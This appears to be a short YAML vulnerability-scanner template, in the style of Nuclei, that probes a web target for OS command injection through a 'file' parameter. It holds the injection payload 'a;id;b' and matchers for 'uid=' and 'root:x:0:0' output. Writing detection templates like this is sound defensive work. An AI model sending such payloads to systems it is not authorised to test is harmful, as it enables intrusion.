id: cmdi3-137
name: 'Command injection in file'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via file'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - 'a;id;b'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'www-data'
